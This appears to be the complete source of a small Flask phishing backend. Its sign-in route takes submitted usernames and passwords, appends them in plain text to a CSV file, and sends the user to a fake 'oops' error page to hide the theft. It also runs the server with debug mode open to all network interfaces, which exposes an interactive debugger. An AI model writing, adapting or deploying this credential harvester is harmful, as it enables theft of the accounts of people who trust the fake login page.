import csv

from flask import Flask, render_template, redirect, url_for, request

app = Flask(__name__)

@app.route('/')
def index():
    return redirect(url_for('signin'))


@app.route('/signin', methods=['GET', 'POST'])
def signin():
    if request.method == 'POST':
        if 'login' in request.form and 'password' in request.form:
            login = request.form['login']
            password = request.form['password']

            with open('info/info.csv', mode='a', newline='') as file:
                writer = csv.writer(file)
                writer.writerow([login, password])

            return redirect(url_for('oops'))

    return render_template('signin.html')

@app.route('/oops', methods=['GET'])
def oops():
    return render_template('oops.html')


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
